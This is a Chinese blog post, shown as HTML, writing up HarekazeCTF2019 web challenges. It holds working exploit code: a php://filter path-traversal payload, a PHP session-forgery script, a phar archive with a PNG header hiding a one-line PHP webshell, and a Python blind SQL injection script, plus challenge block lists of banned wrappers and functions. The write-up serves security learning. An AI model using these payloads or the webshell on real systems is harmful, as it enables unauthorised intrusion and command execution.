@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      HarekazeCTF2019 | WEB题解 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>HarekazeCTF2019 | WEB题解</h2>
+  <p class="post-date">2019-11-08 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>日常精准复现CTF</p>
+<h1 id="encode-and-encode"><a href="#encode-and-encode" class="headerlink" title="encode_and_encode"></a>encode_and_encode</h1><p>考点：编码json转义unicode编码绕过</p>
+<p>题解：<a href="https://ctftime.org/writeup/15459" target="_blank" rel="noopener">https://ctftime.org/writeup/15459</a></p>
+<p><a href="https://xz.aliyun.com/t/6628" target="_blank" rel="noopener">https://xz.aliyun.com/t/6628</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>
+
+<p>is_valid过滤危险字符，但是可以发现if语句中作用的is_valid是还未被json_decode解码。</p>
+<p>利用json转义格式\u00(url编码字符)绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. &#x3D;&gt; \u002e      F &#x3D;&gt; \u0066</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1573041252425.png" alt="1573041252425"></p>
+<p>最终paylaod</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"page"</span>: <span class="string">"php://filter/convert.base64-encode/resource=\u002e\u002e/\u002e\u002e/\u002e\u002e/\u002e\u002e/\u0066lag"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="easy-notes"><a href="#easy-notes" class="headerlink" title="easy_notes"></a>easy_notes</h1><p>考点：session反序列化</p>
+<p>export.php,会使用ZipArchive或PharData创建文件并写入note内容(可控)。再看生成的filename方法get_user()返回注册的用户名。且这里过了了<code>..</code>无法遍历目录。文件内容会通过回显示头带入</p>
+<p><img src="./1573114337001.png" alt="1573114337001"></p>
+<p>$note值会将传入的$title、$body压入$_SESSION[‘notes’]数组</p>
+<p><img src="./1573112891671.png" alt="1573112891671"></p>
+<p>flag.php,得到flag需要得到验证函数is_admin</p>
+<p><img src="/media/osword/081D145C081D145C/%E5%A4%87%E4%BB%BD/Nutstore%20Files/Typora/ctf/HarekazeCTF2019.assets/1573114568489.png" alt="1573114568489"></p>
+<p>这里需要$_SESSION[‘admin’]==true是个布尔值</p>
+<p><img src="./1573114654589.png" alt="1573114654589"></p>
+<p>考点明显是通过后端解析引擎差异对session进行反序列化。伪造session文件sess_axxxxxxx，写入<code>|N;admin|b:1;</code>，在以该文件名除去sess_作为cookie去访问flag文件触发反序列化，成功伪造admin身份，得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">'http://b745d7be-e0af-433d-9670-7c5b773aa47b.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># login as sess_</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.post(URL + <span class="string">'login.php'</span>, data=&#123;</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'sess_aaaa'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># make a crafted note</span></span><br><span class="line">sess.post(URL + <span class="string">'add.php'</span>, data=&#123;</span><br><span class="line">    <span class="string">'title'</span>: <span class="string">'name|s:3:"456";admin|b:1;'</span>,</span><br><span class="line">    <span class="string">'body'</span>: <span class="string">'hello'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># make a fake session</span></span><br><span class="line">r = sess.get(URL + <span class="string">'export.php?type=.'</span>).headers[<span class="string">'Content-Disposition'</span>]</span><br><span class="line">sessid = re.findall(<span class="string">r'sess_([0-9a-z-]+)'</span>, r)[<span class="number">0</span>]</span><br><span class="line">  <span class="comment"># get the flag</span></span><br><span class="line">r = requests.get(URL + <span class="string">'?page=flag'</span>, cookies=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: sessid</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1573116094276.png" alt="1573116094276"></p>
+<h1 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h1><p>关键代码如下</p>
+<p>分别使用finfo_file和getimagesize判断文件类型很是奇怪，考虑执行差异。</p>
+<p><img src="./1573125060507.png" alt="1573125060507"></p>
+<p>传入如下文件</p>
+<p>本地测试时候发现finfo可以读取到类型，但是getimagesize无法识别，利用此绕过<code>$size[2] !== IMAGETYPE_PNG</code></p>
+<p><img src="./1573125130532.png" alt="1573125130532"></p>
+<p><img src="./1573125144393.png" alt="1573125144393"></p>
+<p>flag</p>
+<p><img src="./1573125218861.png" alt="1573125218861"></p>
+<h1 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h1><p>考点：代码审计、phar反序列化、函数缺陷</p>
+<p>hint:<a href="https://www.php.net/manual/ja/function.password-hash.php" target="_blank" rel="noopener">https://www.php.net/manual/ja/function.password-hash.php</a></p>
+<p>upload.php：中FLAG1已经在upload1 利用结束</p>
+<p>如下为session生成方法，构造方法中可以看出设置的cookie值是由明文data和加密后的data以<code>.</code>拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureClientSession</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $cookieName;</span><br><span class="line">  <span class="keyword">private</span> $secret;</span><br><span class="line">  <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cookieName = <span class="string">'session'</span>, $secret = <span class="string">'secret'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = $secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($cookieName, $_COOKIE)) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>($data, $signature) = explode(<span class="string">'.'</span>, $_COOKIE[$cookieName]);</span><br><span class="line">        $data = urlsafe_base64_decode($data);</span><br><span class="line">        $signature = urlsafe_base64_decode($signature);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify($data, $signature)) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;data = json_decode($data, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">$this</span>-&gt;cookieName = $cookieName;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_key_exists($key, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $defaultValue = null)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isset($key)) &#123;</span><br><span class="line">      <span class="keyword">return</span> $defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($key, $value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[$key] = $value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;data[$key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $json = json_encode(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    $value = urlsafe_base64_encode($json) . <span class="string">'.'</span> . urlsafe_base64_encode(<span class="keyword">$this</span>-&gt;sign($json));</span><br><span class="line">    setcookie(<span class="keyword">$this</span>-&gt;cookieName, $value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($string, $signature)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;secret . $string, $signature);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_hash(<span class="keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再看sign方法中password_hash函数对第一个参数长度超过72会截断，也暗示着如果超出72字节的部分加密后的结果与72字节相同</p>
+<p><img src="./1573129972732.png" alt="1573129972732"></p>
+<p>再看error方法，$message赋值到$session设置中，输出之后的data值是超过72字节</p>
+<p><img src="./1573130886081.png" alt="1573130886081"></p>
+<p><img src="./1573130861491.png" alt="1573130861491"></p>
+<p>一处可以利用的点，include可以触发phar包写一句话木马</p>
+<p>可以向theme键value值替换为需要包含的文件路径,在加上error方法导致的长度大于72，可以控制data部分值，并且绕过签名验证。</p>
+<p><img src="./1573129102382.png" alt="1573129102382"></p>
+<p><img src="./1573129084102.png" alt="1573129084102"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>phar包构造,需要构造$png_header绕过upload.php两个图片验证，写入exp.css文件带有一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1573189902248.png" alt="1573189902248"></p>
+<p>上传该phar包</p>
+<p><img src="./1573189920227.png" alt="1573189920227"></p>
+<p>赋值新生成的session，进行进一步伪造，增加theme键</p>
+<p><img src="./1573190007834.png" alt="1573190007834"></p>
+<p>替换原来的data值,index.php包含之，就能够执行命令</p>
+<p><img src="./1573190100617.png" alt="1573190100617"></p>
+<p><img src="./1573189601089.png" alt="1573189601089"></p>
+<p><strong>flag</strong></p>
+<p><img src="./1573189633670.png" alt="1573189633670"></p>
+<h1 id="Sqlite-Voting"><a href="#Sqlite-Voting" class="headerlink" title="Sqlite Voting"></a>Sqlite Voting</h1><p>考点：逻辑报错、sql注入、sqlite、过滤绕过</p>
+<p>sqlite函数列表：<a href="https://www.sqlite.org/lang_corefunc.html" target="_blank" rel="noopener">https://www.sqlite.org/lang_corefunc.html</a></p>
+<p><img src="./1573196682665.png" alt="1573196682665"></p>
+<p>vote.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'You must specify vote id'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">'message'</span> =&gt; <span class="string">'Thank you for your vote! The result will be published after the CTF finished.'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>根据源码，创建模拟数据方便测试</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装:sudo apt install sqlite3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟数据创建</span></span><br><span class="line">sqlite&gt; DROP TABLE IF EXISTS `vote`;</span><br><span class="line">sqlite&gt; CREATE TABLE `vote` (</span><br><span class="line">   ...&gt;   `id` INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">   ...&gt;   `name` TEXT NOT NULL,</span><br><span class="line">   ...&gt;   `count` INTEGER</span><br><span class="line">   ...&gt; );</span><br><span class="line">sqlite&gt; INSERT INTO `vote` (`name`, `count`) VALUES</span><br><span class="line">   ...&gt;   ('dog', 0),</span><br><span class="line">   ...&gt;   ('cat', 0),</span><br><span class="line">   ...&gt;   ('zebra', 0),</span><br><span class="line">   ...&gt;   ('koala', 0);</span><br><span class="line">sqlite&gt; create table flag (flag text);</span><br><span class="line">sqlite&gt; insert into flag values ('HarekazeCTF&#123;test&#125;');</span><br></pre></td></tr></table></figure>
+
+<p>解题思路是利用sqlite逻辑报错进行盲注,abs函数存在整型溢出</p>
+<p>利用ifnull,nullif注入flag长度</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://236fd178-f35e-4f3e-88e0-70374086e68c.node3.buuoj.cn/vote.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag length</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),<span class="subst">&#123;i&#125;</span>),0x8000000000000000))'</span></span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(url,data=data)</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'An error occurred'</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">        print(<span class="string">'length: '</span>+str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./1573196707908.png" alt="1573196707908"></p>
